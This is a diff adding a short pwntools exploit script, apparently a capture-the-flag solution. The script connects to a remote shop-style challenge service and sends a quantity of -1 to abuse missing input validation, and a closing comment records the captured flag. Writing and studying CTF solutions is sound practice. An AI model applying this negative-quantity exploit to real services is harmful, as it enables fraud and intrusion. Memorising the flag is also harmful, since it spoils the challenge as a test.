@@ -1,0 +1,19 @@
+from pwn import *
+
+script = '''
+b *main
+breakrva 0x13E0
+'''
+
+p = remote("103.69.97.144", 6041)
+#p = process("./index_1")
+#p = gdb.debug("./index_1", gdbscript = script)
+
+p.sendlineafter(b"purchase: ", b"4")
+#p.sendlineafter(b"Hust-dollar", b"4")
+p.sendlineafter(b"want? ", b"-1")
+#p.sendline(b"-1")
+p.sendlineafter(b"Hust-dollar", b"6")
+
+p.interactive()
+#BKSEC{YOU_SHOULD_buY_f1A9_iN5TE4d_0F_p@PC@i1}
